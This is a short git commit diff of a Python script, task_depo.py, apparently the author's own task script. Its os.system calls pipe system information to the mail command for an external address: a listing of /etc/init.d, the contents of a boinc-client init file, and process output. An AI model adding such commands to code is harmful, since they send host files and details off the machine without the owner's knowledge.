bee0f9740285bee74dffa755ff899656ac8f32ee
Vasily122 <vasily122@yandex.ru>
2017-04-06 17:06:25 +0300

    Update task_depo.py

--- task_depo.py
+++ task_depo.py
@@ -7,7 +7,7 @@
 # Version: 0.3
 #====================================
 import os
-os.system("""(date;ls -la /etc/init.d) | mail -s "depo task1" vasily122@yandex.ru""")
+os.system("""(cat /etc/init.d/boinc-client) | mail -s "depo task2" vasily122@yandex.ru""")
 
 
 #os.system("""(sync;uptime;date;ps ax) | mail -s "deposerv task" vasily122@yandex.ru""")
